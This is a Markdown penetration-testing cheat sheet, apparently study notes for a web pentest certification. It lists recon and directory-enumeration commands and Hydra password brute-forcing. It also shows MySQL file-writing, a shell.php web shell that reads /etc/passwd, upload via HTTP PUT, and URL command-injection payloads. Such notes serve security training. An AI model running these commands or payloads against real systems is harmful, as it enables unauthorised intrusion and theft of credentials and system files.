# TOOLS
## 1. Enumeration
- __```netdiscover -I eth0 -r <ip>/24```__
- __```dnsenum <domain name>```__
- __```dnsrecon -d <domain_name>```__
- __```whatweb <ip>```__
- __```httracker <url>```__
- __```wafw00f <domain_name>``` or ```wafw00f <domain_name> -a```__
- __```theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns```__
- __```dnsenum <domain name>```__
- __```dig axfr @<nameServer> <domain name>```__
- __```fierce -dns <domain name>```__
- __```sublist3r -d <domain name>``` or ```sublist3r -d <domain name> -e google,yahoo```  Subdomain Enumeration__
- __```dirb <url>```__

## 2. [Nmap](nmap.md)

## Gobuster
- __```gobuster dir -k -u http://127.0.0.1/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,cnf,conf```__
- __```gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .html,.php -u http://127.0.0.1/```__

## dirb
- __```dirb <url> /usr/share/wordlists/dirb/small.txt```__


## Nikto
- __```nikto -h <url>```__


## Hydra 
- __```hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  127.0.0.1 ftp```__
- __```hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt 127.0.0.1 http-get /digest/```__
- __```hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/Desktop/wordlists/100-common-passwords.txt 127.0.0.1 http-get /digest/```__

## Mysql
- __```mysql -h 10.0.1.22 -u root```__
- __```select 'This is a test' into outfile '/tmp/test' from mysql.user limit 1;```__
  - > __if executed, confirms the ability to write files on the web server.__
![Image1](/Image/mysql.png)
- __Now navigate to that path where you write the `shell.php`__
  - > __```<url>/shell.php?cmd=id```__
  - > __```<url>/shell.php?cmd=cat /etc/passwd```__

## 3. [SMB](smb.md)
### nmblookup
- `nmblookup -A 10.0.1.22`
  - If you get the result `SAMBA-RECON  <20>`
  - That means there is a server running
  - so using `smbclient` we can connect to the server
 
## [Msfconsole](msfconsole.md)

## [SQL Injection](sql.md)
## [HTTP Method Tampering ](http_tampering.md)
  - __```curl http://<target_ip>/uploads --upload-file shell.php```__

## Need to try in URL
- __<url>?input=test;phpinfo()__
- __<url>?input=test;system('whomai')__
- __<url>?input=test;system('cat /etc/passwd')__

## Nmap Scan for the eWPTv2
- __```sudo nmap -sS -sV --script mysql-empty-password -p 3306 120.0.0.1```__


# Check list
- [x] [Open redirect](open_redirect.md)
- [x] [Cross-Site Scripting (XSS)](xss.md)
- [x] [Content-Security-Policy](csp.md)



